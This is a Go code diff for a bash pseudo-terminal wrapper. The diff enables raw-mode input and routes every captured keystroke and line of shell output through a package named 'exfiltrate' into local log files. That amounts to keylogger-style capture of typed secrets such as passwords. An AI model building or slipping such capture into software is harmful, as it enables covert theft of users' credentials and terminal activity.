@@ -8,9 +8,11 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"sexonthebash/pkg/exfiltrate"
 	"syscall"
 
 	"github.com/creack/pty"
+	"golang.org/x/term"
 )
 
 // func test() (in string, out string, err error) {
@@ -44,18 +46,17 @@ func main() {
 	ch <- syscall.SIGWINCH                        // Initial resize.
 	defer func() { signal.Stop(ch); close(ch) }() // Cleanup signals when done.
 
-	// // Set stdin in raw mode.
-	// oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
-	// if err != nil {
-	// 	panic(err)
-	// }
-	// defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.
+	// Set stdin in raw mode.
+	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
+	if err != nil {
+		panic(err)
+	}
+	defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.
 
 	// Copy stdin to the pty and the pty to stdout.
 	// NOTE: The goroutine will keep reading until the next keystroke before returning.
 
 	var outBuffer bytes.Buffer
-	// var errBuffer bytes.Buffer
 	var inBuffer bytes.Buffer
 
 	mwOut := io.MultiWriter(os.Stdout, &outBuffer)
@@ -64,7 +65,9 @@ func main() {
 	_, _ = io.Copy(mwOut, ptmx)
 
 	fmt.Println("after bash")
-	fmt.Println("Captured output", outBuffer.String())
-	// fmt.Println("Captured error", errBuffer.String())
-	fmt.Println("Captured input", inBuffer.String())
+	// fmt.Println("Captured output", outBuffer.String())
+	exfiltrate.WriteFile(outBuffer.String(), "./output.log")
+
+	// fmt.Println("Captured input", inBuffer.String())
+	exfiltrate.WriteFile(inBuffer.String(), "./input.log")
 }
